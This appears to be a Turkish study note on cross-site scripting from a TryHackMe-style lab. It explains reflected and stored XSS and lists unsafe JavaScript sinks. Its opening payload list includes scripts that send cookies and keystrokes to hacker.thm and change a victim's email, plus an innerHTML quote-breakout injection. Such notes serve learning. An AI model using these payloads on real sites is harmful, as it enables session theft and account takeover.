# PAYLOADS

* `<script>alert('XSS');</script>` : Sitede js kodu çalıştırılabilir mi anlamak için yapılan basit bir popup komutu.

* `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

* `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>` : Keylogger

* `<script>user.changeEmail('attacker@hacker.thm');</script>`

## Reflected XSS

Eğer bir web uygulaması kullanıcı tarafından girilen verileri yeterince kontrol etmez ve bu verileri doğrudan web sayfasının kaynak koduna eklerse burda bir **Reflceted XSS** açığı oluşabilir.

## Stored XSS
Adından da anlaşılacağı gibi, XSS verisi web uygulamasında (örneğin bir veritabanında) depolanır ve daha sonra diğer kullanıcılar siteyi veya web sayfasını ziyaret ettiğinde çalıştırılır. 

---

## Kaynak kodunda hangi güvenli olmayan JavaScript kodunu aramalıyız ?

### InnerHTML Kullanımı:
innerHTML özelliğinin kullanımı, kullanıcı tarafından sağlanan verilerin doğrudan HTML içine yerleştirildiği bir durumu işaret edebilir. Bu, kötü niyetli kullanıcıların HTML ve JavaScript enjekte etmesine olanak tanıyabilir.

#### Örnek:

`document.getElementsByClassName('name')[0].innerHTML='kaan';`
bu tarz bir kodu aşmak için `';alert('kaan');//` şeklinde bir kod kullanabiliriz. Baştaki kesme işareti ile `'` isim girilecek alanı kapatabiliriz. Ardından gelen noktalı virgül işareti ise `;` ard arda kod kullanmamıza olanak tanır (linux komutlarında olduğu gibi). Sondaki çift eğik çizgi ise `//` bu girdiden sonra gelen kodları yorum satırına dönüştürmemize olanak tanır. 

### Document.Write Kullanımı:
`document.write` fonksiyonu, sayfanın yüklenme sırasında dinamik olarak içeriği değiştirmek için kullanılır. Ancak, bu yöntem kullanıcı girişlerini kontrol etmeden doğrudan içerik ekleyebilir ve güvenlik riskleri oluşturabilir.

### eval() fonksiyonu:
metin olarak verilen bir JavaScript ifadesini çalıştırır. Kullanıcı tarafından sağlanan verilerle doğrudan kullanıldığında, güvenlik açıklarına neden olabilir. eval yerine daha güvenli alternatifler kullanılmalıdır.

### Inline JavaScript Kodları:
Sayfa içindeki HTML etiketleri arasında veya `onclick`, `onmouseover`, gibi HTML özelliklerinde kullanılan inline JavaScript kodları, kullanıcı girişlerinin doğrudan çalıştırılmasına neden olabilir.

